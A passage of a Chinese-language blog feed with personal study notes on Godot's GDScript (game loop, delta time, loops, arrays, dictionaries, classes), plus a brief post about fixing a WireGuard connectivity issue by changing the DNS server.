href="#10-The-Game-Loop" class="headerlink" title="10. The Game Loop"></a>10. The Game Loop</h1><h1 id="11-Time-Delta"><a href="#11-Time-Delta" class="headerlink" title="11. Time Delta"></a>11. Time Delta</h1><p>每一个游戏脚本都包含 <code>_process(delta)</code> 函数.</p><p>FPS 就是 Frames Per Second, 一帧就是一幅图片, <code>_process(delta)</code> 就是更新图片. 每秒更新 60 次就是 60 帧.</p><h2 id="Frames-take-varying-amounts-of-time-to-calculate"><a href="#Frames-take-varying-amounts-of-time-to-calculate" class="headerlink" title="Frames take varying amounts of time to calculate"></a>Frames take varying amounts of time to calculate</h2><p><code>delta</code> 的意思是 a time difference.</p><p><code>delta</code> 指代的是 Godot 处理 previous frame 的时间，单位是秒. 其值在处理每个 frame 时都会变化.</p><p>这个值要时刻考虑.</p><p>如:</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">func</span> <span class="hljs-function"><span class="hljs-title">_process</span>(<span class="hljs-variable">delta</span>):</span><br><span class="hljs-function">    <span class="hljs-title">rotate</span>(<span class="hljs-number">2</span> * <span class="hljs-variable">delta</span>)</span><br></code></pre></td></tr></table></figure><p>这就使得旋转的角度是和时间相关的函数，时间肯定是均匀变化的，因此旋转的角度也是匀速的, 如果不这样写，因为处理每一帧所花的时间不同，转动相同角度所花的时间就会不同，会造成不匀速变化.</p><h1 id="12-Using-Variables-to-Make-Code-Easier-to-Read"><a href="#12-Using-Variables-to-Make-Code-Easier-to-Read" class="headerlink" title="12. Using Variables to Make Code Easier to Read"></a>12. Using Variables to Make Code Easier to Read</h1><p>在函数中定义的变量只能在函数中使用.</p><h1 id="13-Conditions"><a href="#13-Conditions" class="headerlink" title="13. Conditions"></a>13. Conditions</h1><p><code>if</code> 语句:</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">if</span> condition:<br>    <span class="hljs-params">...</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> condition:<br>    <span class="hljs-params">...</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-params">...</span><br></code></pre></td></tr></table></figure><h1 id="14-Multiplying"><a href="#14-Multiplying" class="headerlink" title="14. Multiplying"></a>14. Multiplying</h1><h1 id="15-Modulo"><a href="#15-Modulo" class="headerlink" title="15. Modulo"></a>15. Modulo</h1><p>取余只能作用于整数.</p><h2 id="Using-modulo-to-find-even-and-odd-numbers"><a href="#Using-modulo-to-find-even-and-odd-numbers" class="headerlink" title="Using modulo to find even and odd numbers"></a>Using modulo to find even and odd numbers</h2><h2 id="Calculating-a-random-number-within-a-range"><a href="#Calculating-a-random-number-within-a-range" class="headerlink" title="Calculating a random number within a range"></a>Calculating a random number within a range</h2><p>使用 <code>randi()</code> (random integer) 函数可以获得一个随机整数.</p><h1 id="16-2D-Vectors"><a href="#16-2D-Vectors" class="headerlink" title="16. 2D Vectors"></a>16. 2D Vectors</h1><p>之所以 <code>scale</code> 变量有两个 sub-variables 是因为  <code>scale</code> 是一个 2 维向量 Vector2.</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">func</span> level_up():<br>    <span class="hljs-attribute">scale</span> += Vector2(<span class="hljs-number">0</span>.<span class="hljs-number">2</span>, <span class="hljs-number">0</span>.<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>其和:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">func</span> level_up():<br>    <span class="hljs-attribute">scale</span>.x += <span class="hljs-number">0</span>.<span class="hljs-number">2</span><br>    <span class="hljs-attribute">scale</span>.y += <span class="hljs-number">0</span>.<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>等价.</p><p><code>Vector2()</code> 被称作构造函数.</p><h2 id="Using-vectors-to-change-the-position"><a href="#Using-vectors-to-change-the-position" class="headerlink" title="Using vectors to change the position"></a>Using vectors to change the position</h2><h1 id="17-Introduction-to-While-Loops"><a href="#17-Introduction-to-While-Loops" class="headerlink" title="17. Introduction to While Loops"></a>17. Introduction to While Loops</h1><p>如:</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs fortran"><span class="hljs-keyword">while</span> <span class="hljs-keyword">number</span> &lt; <span class="hljs-number">4</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-keyword">number</span>)<br></code></pre></td></tr></table></figure><h1 id="18-Introduction-to-For-Loops"><a href="#18-Introduction-to-For-Loops" class="headerlink" title="18. Introduction to For Loops"></a>18. Introduction to For Loops</h1><p>如:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">for</span> number in range(<span class="hljs-number">3</span>):<br>    <span class="hljs-attribute">cell</span> += Vector2(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p><code>range(3)</code> 返回的是 <code>[0, 1, 2]</code>, 范围是 <code>0 ~ n-1</code></p><h2 id="array"><a href="#array" class="headerlink" title="array"></a>array</h2><p>如:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">var</span> arr = <span class="hljs-selector-attr">[0, 1, 2]</span><br></code></pre></td></tr></table></figure><h1 id="19-Creating-arrays"><a href="#19-Creating-arrays" class="headerlink" title="19. Creating arrays"></a>19. Creating arrays</h1><p>用数组来存储路径，如:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">var turtle_path = [ Vector<span class="hljs-number">2</span><span class="hljs-comment">(1,0)</span>, Vector<span class="hljs-number">2</span><span class="hljs-comment">(1,1)</span>, Vector<span class="hljs-number">2</span><span class="hljs-comment">(2,1)</span>, Vector<span class="hljs-number">2</span><span class="hljs-comment">(3,1)</span>, Vector<span class="hljs-number">2</span><span class="hljs-comment">(4,1)</span>, Vector<span class="hljs-number">2</span><span class="hljs-comment">(5,1)</span>,   ]<br></code></pre></td></tr></table></figure><h1 id="20-Looping-over-arrays"><a href="#20-Looping-over-arrays" class="headerlink" title="20. Looping over arrays"></a>20. Looping over arrays</h1><p>如:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">var</span> numbers = [ <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span> ]<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">number</span> in numbers:<br>    print(<span class="hljs-built_in">number</span>)<br></code></pre></td></tr></table></figure><p><code>in</code> 关键词可以确定一个元素是否在数组中:</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs erlang"><span class="hljs-keyword">if</span> cell in cells:<br>    ...<br></code></pre></td></tr></table></figure><p><code>append()</code> 函数在数组后面加上一个元素:</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">selected_units.<span class="hljs-built_in">append</span>(cell)<br></code></pre></td></tr></table></figure><h1 id="21-Strings"><a href="#21-Strings" class="headerlink" title="21. Strings"></a>21. Strings</h1><p>和 C 语言一样，Strings 本质上还是数组:</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-keyword">for</span> <span class="hljs-keyword">character</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;Robot&quot;</span>:<br>    <span class="hljs-keyword">print</span>(<span class="hljs-keyword">character</span>)<br></code></pre></td></tr></table></figure><h1 id="22-Functions-that-return-a-value"><a href="#22-Functions-that-return-a-value" class="headerlink" title="22. Functions that return a value"></a>22. Functions that return a value</h1><p>使用 <code>round()</code> 函数，可以将小数截尾:</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml"><span class="hljs-keyword">var</span> rounded_health = <span class="hljs-built_in">round</span>(<span class="hljs-variable language_">health</span>)<br></code></pre></td></tr></table></figure><p><code>lerp()</code> (linear interpolate) 函数.</p><p>使用 <code>return</code> 关键字返回值.</p><h1 id="23-Appending-and-poping-values-from-arrays"><a href="#23-Appending-and-poping-values-from-arrays" class="headerlink" title="23. Appending and poping values from arrays"></a>23. Appending and poping values from arrays</h1><p>数组的三个成员函数:</p><ul><li><code>append()</code></li><li><code>pop_front()</code></li><li><code>pop_back()</code></li></ul><p>可以用 <code>print</code> 直接输出数组内容:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">var</span> crates = <span class="hljs-selector-attr">[<span class="hljs-string">&quot;sword&quot;</span>, <span class="hljs-string">&quot;shield&quot;</span>, <span class="hljs-string">&quot;gems&quot;</span>]</span><br><br>func <span class="hljs-built_in">run</span>():<br>    crates<span class="hljs-selector-class">.pop_back</span>()<br>    <span class="hljs-built_in">print</span>(crates)<br></code></pre></td></tr></table></figure><p>判断数组是否为空可以:</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">var</span> crates = [<span class="hljs-string">&quot;sword&quot;</span>, <span class="hljs-string">&quot;shield&quot;</span>, <span class="hljs-string">&quot;gems&quot;</span>]<br><br><span class="hljs-keyword">while</span> crates:<br>    ...<br></code></pre></td></tr></table></figure><h1 id="24-Accessing-values-in-arrays"><a href="#24-Accessing-values-in-arrays" class="headerlink" title="24. Accessing values in arrays"></a>24. Accessing values in arrays</h1><p>访问数组时可以有负数的 index 如:</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">func <span class="hljs-built_in">run</span>():<br>    <span class="hljs-built_in">use_item</span>(inventory[-<span class="hljs-number">2</span>])<br></code></pre></td></tr></table></figure><h2 id="You-can’t-access-non-existent-indices"><a href="#You-can’t-access-non-existent-indices" class="headerlink" title="You can’t access non-existent indices"></a>You can’t access non-existent indices</h2><p>无法访问不存在的 index.</p><p>可以用 <code>size()</code> 成员函数来获取数组的长度.</p><h1 id="25-Creating-Dictionaries"><a href="#25-Creating-Dictionaries" class="headerlink" title="25. Creating Dictionaries"></a>25. Creating Dictionaries</h1><p>如:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">var</span> <span class="hljs-built_in">dictionary</span> = &#123;<br>    <span class="hljs-attr">key1</span>: value_1,<br>    <span class="hljs-attr">key2</span>: value_2,<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>每一个 key 必须唯一.</p><p>Dictionaries 也被叫做 mappings 或者 associate arrays.</p><p>Dictionaries 使用 Hash 算法，Hash 算法 convert one value into another. 我们提供一个 key, 这个 key 被用于计算一个 Hash 值，然后用这个 Hash 值当作 index 来访问对应的元素. 本质上还是数组，只不过 index 为 Hash 值.</p><p>访问:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">dictionary</span>[key]<br></code></pre></td></tr></table></figure><h1 id="26-Looping-over-dictionaries"><a href="#26-Looping-over-dictionaries" class="headerlink" title="26. Looping over dictionaries"></a>26. Looping over dictionaries</h1><p>两个成员函数:</p><ul><li><code>keys()</code></li><li><code>values()</code><br>其返回数组.</li></ul><h1 id="27-Value-types"><a href="#27-Value-types" class="headerlink" title="27. Value types"></a>27. Value types</h1><p>可以用 <code>+</code> 来连接两个字符串:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;Hello &quot;</span> + <span class="hljs-string">&quot;there&quot;</span>)</span></span><br></code></pre></td></tr></table></figure><p>类型转换:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">str</span><span class="hljs-params">(number)</span></span><br></code></pre></td></tr></table></figure><p>转换为字符串.</p><p>同样有:</p><ul><li><code>int()</code></li><li><code>float()</code></li></ul><h1 id="28-Specifying-types-with-type-hints"><a href="#28-Specifying-types-with-type-hints" class="headerlink" title="28. Specifying types with type hints"></a>28. Specifying types with type hints</h1><p>如:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">var</span> cell_size: Vector2 = Vector2(<span class="hljs-number">50</span>.<span class="hljs-number">0</span>, <span class="hljs-number">50</span>.<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>也可以写成:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">var</span> cell_size := Vector2(<span class="hljs-number">50</span>.<span class="hljs-number">0</span>, <span class="hljs-number">50</span>.<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Godot</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>解决使用华为云香港服务器开启-wireguard-之后无法连接谷歌</title>
    <link href="/2022/11/12/%E8%A7%A3%E5%86%B3%E4%BD%BF%E7%94%A8%E5%8D%8E%E4%B8%BA%E4%BA%91%E9%A6%99%E6%B8%AF%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BC%80%E5%90%AF-wireguard-%E4%B9%8B%E5%90%8E%E6%97%A0%E6%B3%95%E8%BF%9E%E6%8E%A5%E8%B0%B7%E6%AD%8C/"/>
    <url>/2022/11/12/%E8%A7%A3%E5%86%B3%E4%BD%BF%E7%94%A8%E5%8D%8E%E4%B8%BA%E4%BA%91%E9%A6%99%E6%B8%AF%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BC%80%E5%90%AF-wireguard-%E4%B9%8B%E5%90%8E%E6%97%A0%E6%B3%95%E8%BF%9E%E6%8E%A5%E8%B0%B7%E6%AD%8C/</url>
    
    <content type="html"><![CDATA[<p>最终解决方法是换了一个 DNS 服务器，原来是 <code>14.14.14.14</code>, 改成了谷歌的 <code>8.8.8.8</code>, 即可.</p><p><img src="/../img/change_14_to_8_DNS.png"></p><h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><p>先将 wg0 关闭, 然后追踪一下数据包，速度很快，几乎不到一秒钟:<br><img src="/../img/traceroute_without_wg0.png"></p><p>然后将 wg0 启用，再次追踪数据包, 发现路径不同, 且极其缓慢:<br><img src="/../img/traceroute_with_wg0.png"></p><p>猜测可能是路由寻址的问题, 就先换了下 DNS 服务器，结果可行.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-godot-使用</title>
    <link href="/2022/11/11/%E5%85%B3%E4%BA%8E-godot-%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/11/11/%E5%85%B3%E4%BA%8E-godot-%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV14Y411h7Po?p=7&spm_id_from=pageDriver&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">参考 B 站</a></p><p>label 节点用于写文字.</p><p>场景视图和游戏视图:</p><ul><li>场景视图是在编辑器中看到的视图</li><li>游戏视图是运行后的窗口</li></ul><p>子节点的坐标是相对于父节点的.</p><p>游戏窗口的大小可调整.</p><p>一个对象的坐标是其 pivot (中心点) 的坐标.</p><p>图片去除背景. PNG 图片可透明背景.</p><p>可切割使用图片 (只使用图片的一部分)</p><p>一个节点的种类可以直接改变.</p><p>Node 节点 (不是 Node2D) 的特点是可以挂载脚本.</p><p>两个重要的方法:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs gdscript"># 脚本初始化会首先调用这个方法，会在_process()方法之前调用<br>func _ready():<br># get_tree().paused = true<br>pass<br><br>var count = 0<br># 每一帧都会调用这个方法<br>func _process(delta):<br>count = count + 1<br><br>if (count % 60 == 0):<br>print(&quot;parent node&quot;)<br>pass<br></code></pre></td></tr></table></figure><p>父节点的方法先执行. <code>_ready</code> 方法是最先调用的.</p><p>遍历的顺序可以通过修改优先级改变.</p><p>可改变渲染的顺序，调整图层的上下关系.</p><p>z index 也可以改变渲染顺序 (毕竟是 Z 轴, 三维坐标). </p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">extends</span> <span class="hljs-title class_">Node2D</span>    <br></code></pre></td></tr></table></figure><p>这行代码表示从 <code>Node2D</code> 节点继承.</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">export <span class="hljs-selector-tag">var</span> <span class="hljs-selector-tag">a</span><br></code></pre></td></tr></table></figure><p><code>export</code> 应该是声明为全局变量.</p><p>每一个节点实际上就是一个类，有很多可用的方法.</p><p>尽量继承 <code>Node2D</code> 节点.</p><p>定义变量使用 <code>var</code> 关键词.</p><h1 id="1-变量和数据类型"><a href="#1-变量和数据类型" class="headerlink" title="1. 变量和数据类型"></a>1. 变量和数据类型</h1><p>类型可加可不加:</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-built_in">var</span> <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;This is a string&quot;</span><br><span class="hljs-built_in">var</span> <span class="hljs-built_in">str</span>: String = <span class="hljs-string">&quot;This is a string&quot;</span><br></code></pre></td></tr></table></figure><p>加不加类型会影响默认值 (也就是没有给他初始化时的值).</p><p><code>typeof()</code> 方法可以处处类型.</p><p><code>self</code> 表示类自己:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(self <span class="hljs-keyword">is</span> Node)<br></code></pre></td></tr></table></figure><p>输出 <code>Ture</code> 或 <code>False</code>.</p><p><code>int</code> 的范围是 $-2^64+1 ~ 2^64 - 1$.</p><h1 id="2-导出变量"><a href="#2-导出变量" class="headerlink" title="2. 导出变量"></a>2. 导出变量</h1><p>使用 <code>export</code>, 就是在右侧可以直接修改而不是修改源代码.<br><img src="/../img/gdscript_export.png"></p><h1 id="3-函数"><a href="#3-函数" class="headerlink" title="3. 函数"></a>3. 函数</h1><p>示例:</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">func</span> <span class="hljs-title function_">func_name</span><span class="hljs-params">(parameters)</span>:<br>    body<br>    <span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure><p>函数体为空则用 <code>pass</code> 关键字:</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">func</span> <span class="hljs-title function_">func_name</span><span class="hljs-params">(parameters)</span>:<br>    pass<br></code></pre></td></tr></table></figure><h1 id="4-变量作用域"><a href="#4-变量作用域" class="headerlink" title="4. 变量作用域"></a>4. 变量作用域</h1><p>函数内定义是局部.</p><p>外部定义是全局.</p><h1 id="5-运算符"><a href="#5-运算符" class="headerlink" title="5. 运算符"></a>5. 运算符</h1><p>和 C 语言基本相同.</p><p>GDScript 的所有运算是和 C++ 对应的.</p><h1 id="6-条件语句"><a href="#6-条件语句" class="headerlink" title="6. 条件语句"></a>6. 条件语句</h1><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">if</span> (condition):<br>    <span class="hljs-params">...</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (condition):<br>    <span class="hljs-params">...</span> <br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-params">...</span><br></code></pre></td></tr></table></figure><p><code>match</code> 语句，和 C 中的 <code>switch</code> 类似:</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">vat</span> <span class="hljs-variable">local_var</span> = <span class="hljs-number">5</span><br><br><span class="hljs-variable">match</span> <span class="hljs-variable">local_var</span>:<br>    <span class="hljs-number">1</span>:<br>        <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">&quot;match1&quot;</span>)</span><br>    <span class="hljs-number">2</span>:<br>        <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">&quot;match2&quot;</span>)</span><br>    <span class="hljs-number">5</span>:<br>        <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">&quot;match5&quot;</span>)</span><br>    <span class="hljs-number">6</span>:<br>        <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">&quot;match6&quot;</span>)</span><br>    <span class="hljs-variable">_</span>:<br>        <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">&quot;match_&quot;</span>)</span><br></code></pre></td></tr></table></figure><p>默认 <code>default</code> 这里写成下划线 <code>_</code></p><p>可以加上 <code>continue</code> 语句.</p><h1 id="7-循环"><a href="#7-循环" class="headerlink" title="7. 循环"></a>7. 循环</h1><p><code>for</code> 语句:</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">for</span> <span class="hljs-variable">i</span> <span class="hljs-variable"><span class="hljs-keyword">in</span></span> <span class="hljs-function"><span class="hljs-title">range</span>(<span class="hljs-number">20</span>):</span><br><span class="hljs-function">    <span class="hljs-title">print</span>(<span class="hljs-variable">i</span>)</span><br></code></pre></td></tr></table></figure><p><code>while</code> 语句:</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">while</span> param != <span class="hljs-number">0</span>:<br>    <span class="hljs-params">...</span><br></code></pre></td></tr></table></figure><p>似乎可以加括号.</p><p>有 <code>break</code> 和 <code>continue</code>.</p><h1 id="8-数组"><a href="#8-数组" class="headerlink" title="8. 数组"></a>8. 数组</h1><p>用 <code>[]</code> 包裹:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">var</span> arr = <span class="hljs-selector-attr">[0, 1, 2]</span><br></code></pre></td></tr></table></figure><p><code>range(3)</code> 返回的是:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[0, 1, 2]</span><br></code></pre></td></tr></table></figure><p>字典用 <code>&#123;&#125;</code> 包裹. 有 <code>keys</code> 和 <code>values</code> 方法:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">dic.keys<span class="hljs-comment">()</span><br>dic.values<span class="hljs-comment">()</span><br></code></pre></td></tr></table></figure><h1 id="9-静态变量和静态方法"><a href="#9-静态变量和静态方法" class="headerlink" title="9. 静态变量和静态方法"></a>9. 静态变量和静态方法</h1><p><code>const</code> 关键字.</p><p>如:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">const LEN <span class="hljs-operator">=</span> <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>在静态方法中只能访问静态常量, 用 <code>static</code> 关键字:</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span>:<br>    <span class="hljs-keyword">return</span> LEN<br></code></pre></td></tr></table></figure><h1 id="10-对象"><a href="#10-对象" class="headerlink" title="10. 对象"></a>10. 对象</h1><p>使用 <code>class</code> 关键字，类名首字母一般大写, 创建的类一般默认继承 <code>Objects</code> 类.</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">class</span> <span class="hljs-symbol">Animal:</span><br><span class="hljs-symbol">    <span class="hljs-symbol">extends</span></span> <span class="hljs-symbol">Objects</span><br><br>    <span class="hljs-symbol">func</span> <span class="hljs-symbol">_init</span>():<br>        <span class="hljs-symbol">print</span>(&quot;<span class="hljs-symbol">Construct</span>&quot;)<br></code></pre></td></tr></table></figure><p><code>_init()</code> 方法在创建对象时自动运行.</p><p>可重写父类的方法.</p><p>构造一个对象用 <code>new</code> 关键词:</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">var</span> dog = Dog.<span class="hljs-keyword">new</span><span class="hljs-type"></span>(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>在子类中调用父类的方法 (在子类中重写过):</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dos">func <span class="hljs-built_in">move</span>():<br>    <span class="hljs-built_in">print</span>(&quot;Child <span class="hljs-built_in">move</span>&quot;)<br>    .<span class="hljs-built_in">move</span>() # Parent&#x27;s <span class="hljs-built_in">move</span><br></code></pre></td></tr></table></figure><h1 id="11-调试"><a href="#11-调试" class="headerlink" title="11. 调试"></a>11. 调试</h1><h1 id="12-性能统计"><a href="#12-性能统计" class="headerlink" title="12. 性能统计"></a>12. 性能统计</h1><p>下面边栏的 Profile.</p><h1 id="13-监视器-Monitor"><a href="#13-监视器-Monitor" class="headerlink" title="13. 监视器 Monitor"></a>13. 监视器 Monitor</h1><h1 id="14-内存管理"><a href="#14-内存管理" class="headerlink" title="14. 内存管理"></a>14. 内存管理</h1><p>Reference 对象自动回收. 不能使用 <code>free()</code> 方法.</p><p>其他的需要用 <code>free()</code> 方法释放. 注意和 <code>queue_free()</code> 的区别，后者是将对象先放在对象中，然后在某个节点统一释放. 优先使用后者.</p><h1 id="15-垃圾回收的缺点"><a href="#15-垃圾回收的缺点" class="headerlink" title="15. 垃圾回收的缺点"></a>15. 垃圾回收的缺点</h1><p>让程序变慢.</p><p>没有垃圾回收会有内存泄漏的风险.</p><h1 id="16-引用计数算法"><a href="#16-引用计数算法" class="headerlink" title="16. 引用计数算法"></a>16. 引用计数算法</h1><p>创建的对象都有与之关联的计数器. 记录引用的数量.</p><h1 id="17-通过脚本操作节点"><a href="#17-通过脚本操作节点" class="headerlink" title="17. 通过脚本操作节点"></a>17. 通过脚本操作节点</h1><p>可以通过脚本直接创建和添加节点，而不用手动点击添加.</p><p>如:</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">func <span class="hljs-constructor">_ready()</span>:<br>    var sprite = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Sprite</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-literal">()</span><br>    add<span class="hljs-constructor">_child(<span 